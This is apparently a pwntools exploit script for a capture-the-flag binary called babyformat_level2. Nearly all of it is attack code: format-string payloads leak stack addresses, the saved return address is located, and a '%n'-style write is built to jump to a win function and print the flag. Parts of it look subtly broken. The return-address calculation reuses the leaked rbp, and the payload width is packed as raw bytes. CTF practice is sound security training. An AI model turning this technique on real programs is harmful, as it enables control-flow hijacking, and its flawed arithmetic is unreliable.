#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level2
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level2')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
# overwrite return address to win
# 0x1735 -> 0x1330
buf = f"%198lx %199$lx"
io.sendline(buf)
# io.recvuntil(b"triggering the vulnerability:")
io.recvuntil(b"Your input is:")
io.recvline()
leaked_values = io.recvline(keepends=False)
print(f"leaked values : {leaked_values}")

exploit = f"%198lx"
io.sendline(exploit)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rbp = io.recvline(keepends=False)
print(f"leaked rbp : {leaked_rbp}")

rbp_main = int(leaked_rbp, 16)
rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
rip_func = rbp_func + 8
print(f"rip_func : {rip_func}")
# leaked_rbp_64 = u64(leaked_rbp.ljust(8, b"\0"))
# print(f"leaked rbp puts: 0x{leaked_rbp_64:x}")

exploit1 = f"%199$lx"
io.sendline(exploit1)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rip= io.recvline(keepends=False)
leaked_rip_main=int(leaked_rbp, 16)
print(f"leaked rip : {leaked_rip}")
# leaked_rip_64 = u64(leaked_rip.ljust(8, b"\0"))
# print(f"leaked rip puts: 0x{leaked_rip_64:x}")

win_addr = leaked_rip_main - 0x1735 + 0x1330
write_bytes = win_addr - 122
payload = b"%0"+p64(write_bytes)+b"d%81$lnAAAAAA" + p64(rip_func)
io.sendline(payload)
io.recvuntil(b'flag:')
io.interactive()

